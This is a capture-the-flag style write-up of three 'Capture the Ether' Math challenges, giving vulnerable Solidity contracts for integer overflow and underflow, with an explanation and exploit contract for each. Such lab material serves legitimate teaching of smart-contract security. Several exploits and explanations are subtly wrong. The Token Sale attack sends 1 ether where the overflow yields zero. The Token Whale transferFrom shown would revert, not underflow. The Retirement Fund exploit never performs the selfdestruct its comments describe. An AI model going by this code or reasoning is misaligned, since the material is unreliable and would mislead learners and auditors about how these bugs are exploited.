# Capture the Ether: Math Category

## Introduction
The Math category is where things get serious. These challenges focus on integer overflow/underflow, mathematical properties of Solidity types, and creative arithmetic exploits. This is where you'll learn why SafeMath exists and how math bugs can drain millions.

## Challenge 1: Token Sale

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0; // Old version to allow overflow!

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);
        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);
        balanceOf[msg.sender] -= numTokens;
        payable(msg.sender).transfer(numTokens * PRICE_PER_TOKEN);
    }
}
```

**Goal:** Get the contract's balance below 1 ether.

**Vulnerability:** Integer overflow in `numTokens * PRICE_PER_TOKEN`!

If we choose a huge numTokens, the multiplication overflows to a small value.

**Math:**
- PRICE_PER_TOKEN = 1 ether = 10^18
- We need: numTokens * 10^18 to overflow to a small value (like 1 ether)
- In uint256: 2^256 = 115792089237316195423570985008687907853269984665640564039457584007913129639936
- numTokens = 2^256 / 10^18 = 115792089237316195423570985008687907853269984665640564039457584007913 (approximately)

**Exploit:**
```solidity
contract TokenSaleExploit {
    function exploit(TokenSaleChallenge target) public payable {
        // Calculate the overflow value
        uint256 numTokens = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        // Buy tokens (msg.value will be small due to overflow)
        target.buy{value: 1 ether}(numTokens);

        // Sell some tokens to get ETH back
        target.sell(1);
    }
}
```

---

## Challenge 2: Token Whale

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract TokenWhaleChallenge {
    address player;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() public {
        player = msg.sender;
        _mint(player, 1000);
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }

    function _mint(address to, uint256 value) internal {
        totalSupply += value;
        balanceOf[to] += value;
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
    }

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(allowance[from][msg.sender] >= value);
        allowance[from][msg.sender] -= value;
        balanceOf[from] -= value;
        balanceOf[to] += value;
    }
}
```

**Goal:** Get at least 1,000,000 tokens.

**Vulnerability:** Underflow in `allowance[from][msg.sender] -= value`!

If we approve ourselves for 0 tokens, then call transferFrom with a value, the allowance underflows to a huge number!

**Exploit:**
```solidity
contract TokenWhaleExploit {
    function exploit(TokenWhaleChallenge target) public {
        // Approve ourselves for 0 tokens
        target.approve(address(this), 0);

        // Call transferFrom with a large value
        // allowance[attacker][attacker] = 0 - large_value = underflow to huge number!
        target.transferFrom(address(this), address(this), 1000000);
    }
}
```

---

## Challenge 3: Retirement Fund

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract RetirementFundChallenge {
    uint256 startBalance;
    address owner;
    address beneficiary;
    uint256 expiration = block.timestamp + 10 years;

    constructor() public payable {
        owner = msg.sender;
        beneficiary = msg.sender;
        startBalance = msg.value;
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function withdraw() public {
        require(msg.sender == owner);
        require(block.timestamp < expiration);
        payable(msg.sender).transfer(address(this).balance);
    }

    function collectPenalty() public {
        require(msg.sender == beneficiary);
        uint256 withdrawn = startBalance - address(this).balance;
        uint256 penalty = withdrawn / 10;
        payable(msg.sender).transfer(penalty);
    }
}
```

**Goal:** Empty the contract's balance.

**Vulnerability:** Underflow in `startBalance - address(this).balance`!

If we force ETH into the contract (using selfdestruct), `address(this).balance` becomes greater than `startBalance`, causing an underflow!

**Exploit:**
```solidity
contract RetirementFundExploit {
    function exploit(RetirementFundChallenge target) public payable {
        // Force ETH into the contract using selfdestruct
        // This makes address(this).balance > startBalance
        // Then startBalance - address(this).balance underflows!

        // First, collect the penalty (which will be huge due to underflow)
        target.collectPenalty();

        // Then withdraw the remaining balance
        target.withdraw();
    }

    receive() external payable {}
}
```

## Key Takeaways from Math
- **Integer Overflow/Underflow:** The most dangerous math bugs in Solidity < 0.8.0.
- **SafeMath Library:** Always use it for older contracts.
- **Multiplication Overflow:** numTokens * price can overflow to a small value.
- **Subtraction Underflow:** a - b underflows if b > a.
- **Forced ETH:** You can force ETH into contracts to break balance assumptions.
- **Lesson learned:** Math in smart contracts is NOT like math in regular programming. Every operation can have catastrophic consequences.
- **Modern Solidity:** Version 0.8.0+ has built-in overflow protection, but you must still be careful with custom math logic.

## Next Category: Miscellaneous
The Misc category covers everything else: access control bugs, delegatecall exploits, and creative attacks. These are the hardest challenges!